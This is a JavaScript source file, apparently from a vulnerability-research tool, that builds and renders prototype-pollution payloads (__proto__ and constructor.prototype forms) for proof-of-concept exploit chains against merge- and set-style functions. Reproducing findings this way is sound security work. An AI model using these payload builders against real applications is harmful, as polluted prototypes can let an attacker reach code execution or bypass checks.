/**
 * Shared source-call construction for end-to-end chain synthesis.
 *
 * A proven prototype-pollution *source* (a merge/set-style function that, fed
 * attacker-controlled JSON, writes to Object.prototype) is the first half of a
 * full `attacker-input -> source -> gadget -> sink` exploit. To *reproduce* a
 * chain, the reproduction worker must actually call that source to pollute the
 * prototype; to *render* the chain's PoC, the PoC builder must print the exact
 * same call. Those two must never drift, so both derive the call from here.
 *
 * A source is described by two proven facts (recorded when the tool reproduced
 * it as a `pp` finding — see repro-worker.js reproPP):
 *   - payloadKind:     'proto-json' | 'ctor-object' | 'proto-path' | 'ctor-path'
 *   - callConvention:  'fn(payload)' | 'fn(target, payload)' | 'fn(true, {}, payload)'
 *                      | "fn({}, 'path', value)"
 *
 * `props` is the property->value map the source must plant on Object.prototype:
 * the gadget's primary property (carrying the attacker payload string) plus any
 * gate properties (each `true`). Object-shaped sources (proto-json/ctor-object)
 * plant every property in one call; path-shaped sources (proto-path/ctor-path)
 * plant one property per call, so this returns a list of calls.
 */

// Build the object payload a merge-style source consumes to pollute every entry
// of `props`. proto-json mirrors the canonical `{"__proto__": {...}}` JSON body;
// ctor-object mirrors the `constructor.prototype` bypass form.
function protoPayloadObject(payloadKind, props) {
  const inner = {};
  for (const [k, v] of Object.entries(props)) inner[k] = v;
  if (payloadKind === 'ctor-object') {
    return { constructor: { prototype: inner } };
  }
  // proto-json: attacker JSON with a __proto__ key. Built via JSON.parse so the
  // __proto__ key is a real own-property of the payload (an object literal
  // `{__proto__: ...}` would set the payload's prototype instead of a data key),
  // exactly as a `JSON.parse(requestBody)` in real code would produce it.
  return JSON.parse(`{"__proto__":${JSON.stringify(inner)}}`);
}

// Dispatch an object payload through the source's proven calling convention.
function dispatchObject(payload, callConvention) {
  switch (callConvention) {
    case 'fn(payload)':          return [payload];
    case 'fn(true, {}, payload)': return [true, {}, payload];
    case 'fn(target, payload)':
    default:                     return [{}, payload];
  }
}

/**
 * Return the ordered list of argument arrays to apply to the source function to
 * pollute Object.prototype with every entry of `props`.
 *
 * @param {string} payloadKind
 * @param {string} callConvention
 * @param {Record<string, any>} props - primary property + gates -> values
 * @returns {any[][]} one args array per source call
 */
export function sourceCallArgs(payloadKind, callConvention, props) {
  if (payloadKind === 'proto-path' || payloadKind === 'ctor-path') {
    const prefix = payloadKind === 'ctor-path' ? 'constructor.prototype.' : '__proto__.';
    // One set-style call per property: fn({}, '<prefix><key>', value).
    return Object.entries(props).map(([k, v]) => [{}, `${prefix}${k}`, v]);
  }
  const payload = protoPayloadObject(payloadKind, props);
  return [dispatchObject(payload, callConvention)];
}

// ─── PoC rendering (must match sourceCallArgs exactly) ───────────────────────

/**
 * Render the source call(s) as runnable JS statements for a standalone PoC.
 * `sourceRef` is how the source function is addressed in the PoC (e.g. `source`
 * for a bare-function module, or `source.merge`). `propExprs` maps each property
 * to the JS expression to plant (the primary property's value is typically the
 * `<PAYLOAD>` placeholder; gates are `true`).
 *
 * @param {string} sourceRef
 * @param {string} payloadKind
 * @param {string} callConvention
 * @param {Record<string, string>} propExprs - property -> JS expression string
 * @returns {string} newline-joined statements
 */
export function renderSourceCalls(sourceRef, payloadKind, callConvention, propExprs) {
  const entries = Object.entries(propExprs);
  if (payloadKind === 'proto-path' || payloadKind === 'ctor-path') {
    const prefix = payloadKind === 'ctor-path' ? 'constructor.prototype.' : '__proto__.';
    return entries
      .map(([k, expr]) => `${sourceRef}({}, ${JSON.stringify(prefix + k)}, ${expr});`)
      .join('\n');
  }
  const innerParts = entries.map(([k, expr]) => `${JSON.stringify(k)}: ${expr}`).join(', ');
  let payloadExpr;
  if (payloadKind === 'ctor-object') {
    payloadExpr = `{ constructor: { prototype: { ${innerParts} } } }`;
  } else {
    // proto-json: show the attacker sending real JSON with a __proto__ key.
    payloadExpr = `JSON.parse('{"__proto__": ' + JSON.stringify({ ${innerParts} }) + '}')`;
  }
  const args =
    callConvention === 'fn(payload)' ? payloadExpr
      : callConvention === 'fn(true, {}, payload)' ? `true, {}, ${payloadExpr}`
        : `{}, ${payloadExpr}`;
  return `${sourceRef}(${args});`;
}
